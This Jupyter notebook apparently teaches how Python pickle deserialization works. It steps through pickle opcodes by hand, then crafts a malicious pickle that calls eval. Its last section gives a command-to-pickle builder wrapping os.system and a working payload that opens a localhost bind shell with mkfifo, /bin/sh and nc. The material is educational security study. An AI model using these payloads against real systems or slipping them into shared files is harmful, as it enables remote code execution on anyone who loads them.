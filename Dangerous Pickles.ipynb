{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Dangerous Pickles"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Based on: https://intoli.com/blog/dangerous-pickles/\n",
    "\n",
    "See also: https://huggingface.co/docs/hub/security-pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle\n",
    "\n",
    "# start with any instance of a Python type\n",
    "original = { 'a': 0, 'b': [1, 2, 3] }\n",
    "\n",
    "# turn it into a string\n",
    "pickled = pickle.dumps(original)\n",
    "\n",
    "# turn it back into an identical object\n",
    "identical = pickle.loads(pickled)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Example ```Bomb``` class to be pickle'd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "class Bomb:\n",
    "    def __init__(self, name):\n",
    "        self.name = name\n",
    "\n",
    "    def __getstate__(self):\n",
    "        return self.name\n",
    "\n",
    "    def __setstate__(self, state):\n",
    "        self.name = state\n",
    "        print(f'Bang! From, {self.name}.')\n",
    "\n",
    "bomb = Bomb('Evan')\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The __setstate__() and __getstate__() methods are used by the pickle module to serialize and deserialize classes. You often don’t need to define these yourself because the default implementations will just serialize the instance’s __dict__. As you can see, I’ve defined them explicitly here so that I can sneak in a little surprise for when the Bomb object is deserialized."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Bang! From, Evan.\n"
     ]
    }
   ],
   "source": [
    "import pickle\n",
    "\n",
    "pickled_bomb = pickle.dumps(bomb, protocol=0)\n",
    "unpickled_bomb = pickle.loads(pickled_bomb)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nBomb\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\nVEvan\\np5\\nb.'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pickled_bomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "    0: c    GLOBAL     'copy_reg _reconstructor'\n",
      "   25: p    PUT        0\n",
      "   28: (    MARK\n",
      "   29: c        GLOBAL     '__main__ Bomb'\n",
      "   44: p        PUT        1\n",
      "   47: c        GLOBAL     '__builtin__ object'\n",
      "   67: p        PUT        2\n",
      "   70: N        NONE\n",
      "   71: t        TUPLE      (MARK at 28)\n",
      "   72: p    PUT        3\n",
      "   75: R    REDUCE\n",
      "   76: p    PUT        4\n",
      "   79: V    UNICODE    'Evan'\n",
      "   85: p    PUT        5\n",
      "   88: b    BUILD\n",
      "   89: .    STOP\n",
      "highest protocol among opcodes = 0\n"
     ]
    }
   ],
   "source": [
    "import pickletools\n",
    "\n",
    "pickletools.dis(pickled_bomb)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "    0: c    GLOBAL     'copy_reg _reconstructor'\n",
      "   25: (    MARK\n",
      "   26: c        GLOBAL     '__main__ Bomb'\n",
      "   41: c        GLOBAL     '__builtin__ object'\n",
      "   61: N        NONE\n",
      "   62: t        TUPLE      (MARK at 25)\n",
      "   63: R    REDUCE\n",
      "   64: V    UNICODE    'Evan'\n",
      "   70: b    BUILD\n",
      "   71: .    STOP\n",
      "highest protocol among opcodes = 0\n"
     ]
    }
   ],
   "source": [
    "pickled_bomb = pickletools.optimize(pickled_bomb)\n",
    "pickletools.dis(pickled_bomb)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 0: emulate memory / stack for pickle machine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "# the PM's longterm memory/storage\n",
    "memo = {}\n",
    "# the PM's stack, which most opcodes interact with\n",
    "stack = []"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 1: put global object on stack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Push a global object (module.attr) on the stack.\n",
    "#  0: c    GLOBAL     'copy_reg _reconstructor'\n",
    "from copyreg import _reconstructor\n",
    "stack.append(_reconstructor)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 2: put special ```markobject``` on stack (rep'd with 'MARK')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Push markobject onto the stack.\n",
    "# 25: (    MARK\n",
    "stack.append('MARK')\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 3: putting global object on stack - our ```Bomb```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Push a global object (module.attr) on the stack.\n",
    "# 26: c        GLOBAL     '__main__ Bomb'\n",
    "stack.append(Bomb)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 4: setting up global ```object``` from __builtin__"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Push a global object (module.attr) on the stack.\n",
    "# 41: c        GLOBAL     '__builtin__ object'\n",
    "stack.append(object)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 5: putting ```NONE``` on stack (???)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Push None on the stack.\n",
    "# 61: N        NONE\n",
    "stack.append(None)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 6: replace everything since ```markobject``` with a tuple"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Build a tuple out of the topmost stack slice, after markobject.\n",
    "# 62: t        TUPLE      (MARK at 28)\n",
    "last_mark_index = len(stack) - 1 - stack[::-1].index('MARK')\n",
    "mark_tuple = tuple(stack[last_mark_index + 1:])\n",
    "stack = stack[:last_mark_index] + [mark_tuple]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# the stack before the TUPLE operation:\n",
    "[<function copyreg._reconstructor>, 'MARK', __main__.Bomb, object, None]\n",
    "# the stack after the TUPLE operation:\n",
    "[<function copyreg._reconstructor>, (__main__.Bomb, object, None)]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 7: ```REDUCE``` pops last two things off stack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Push an object built from a callable and an argument tuple.\n",
    "# 63: R    REDUCE\n",
    "args = stack.pop()\n",
    "callable = stack.pop()\n",
    "stack.append(callable(*args))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 8: plop a Unicode string on the stack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Push a Python Unicode string object.\n",
    "# 64: V    UNICODE    'Evan'\n",
    "stack.append(u'Evan')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 9: ```BUILD``` takes last thing off stack and pushes it to __setstate__()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Bang! From, Evan.\n"
     ]
    }
   ],
   "source": [
    "# Finish building an object, via __setstate__ or dict update.\n",
    "# 70: b    BUILD\n",
    "arg = stack.pop()\n",
    "stack[-1].__setstate__(arg)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 10: ```STOP``` means the top of stack is final result"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Stop the unpickling machine.\n",
    "# 71: .    STOP\n",
    "unpickled_bomb = stack[-1]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "simplified version:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Bang! From, Evan.\n"
     ]
    }
   ],
   "source": [
    "# Instruction 1, where `_reconstructor` was imported\n",
    "from copyreg import _reconstructor\n",
    "\n",
    "# Instruction 7, where `_reconstructor` was called\n",
    "unpickled_bomb = _reconstructor(cls=Bomb, base=object, state=None)\n",
    "# Instruction 9, where `__setstate__` was called\n",
    "unpickled_bomb.__setstate__('Evan')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "ULTRASIMPLIFIED version:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Bang! From, Evan.\n"
     ]
    }
   ],
   "source": [
    "unpickled_bomb = object.__new__(Bomb)\n",
    "unpickled_bomb.__setstate__('Evan')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Building our own"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# add a function to the stack to execute arbitrary python\n",
    "GLOBAL     '__builtin__ eval'\n",
    "# mark the start of our args tuple\n",
    "MARK\n",
    "    # add the Python code that we want to execute to the stack\n",
    "    UNICODE    'print(\"Bang! From, Evan.\")'\n",
    "    # wrap that code into a tuple so it can be parsed by REDUCE\n",
    "    TUPLE\n",
    "# call `eval()` with our Python code as an argument\n",
    "REDUCE\n",
    "# STOP is required to be valid PM code\n",
    "STOP\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now to convert this into an actual pickle, we need to replace each opcode with its corresponding ASCII code: c for GLOBAL, ( for MARK, V for UNICODE, t for TUPLE, R for REDUCE, and . for STOP"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "c__builtin__\n",
    "eval\n",
    "(Vprint(\"Bang! From, Evan.\")\n",
    "tR."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Bang! From, Evan.\n"
     ]
    }
   ],
   "source": [
    "# Run me at home!\n",
    "# I'm safe, I promise!\n",
    "pickled_bomb = b'c__builtin__\\neval\\n(Vprint(\"Bang! From, Evan.\")\\ntR.'\n",
    "pickle.loads(pickled_bomb)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# malicious pickle ideas"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [],
   "source": [
    "def command2pickle(command: str):\n",
    "    return b'c__builtin__\\neval\\n(V__import__(\"os\").system(\"' + command.encode() + b'\")\\ntR.'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### opens a ncat listener that pipes input to bash"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Props to the ```ncat``` ```man``` page for this example!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "c__builtin__\n",
      "eval\n",
      "(V__import__(\"os\").system(\"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1999 > /tmp/f\")\n",
      "tR.\n"
     ]
    }
   ],
   "source": [
    "# pickle command builder\n",
    "# command = input(\"what bash command do you to pickle in?\")\n",
    "# command = 'nc -l 127.0.0.1 1999 | /bin/sh -i 2>&1'\n",
    "command = 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 199\\\n",
    "9 > /tmp/f'\n",
    "pickled_shell = b'c__builtin__\\neval\\n(V' + b'__import__(\"os\").system(\"' \\\n",
    "    + command.encode() + b'\")\\ntR.'\n",
    "print(pickled_shell.decode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# works!\n",
    "pickle.loads(pickled_shell)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "if you are brave enough to pickle this in on your machine (do not use maliciously! do not use for violations of law or policy!), simply ```nc 127.0.0.1 1999``` and you have a shell on your own machine!"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
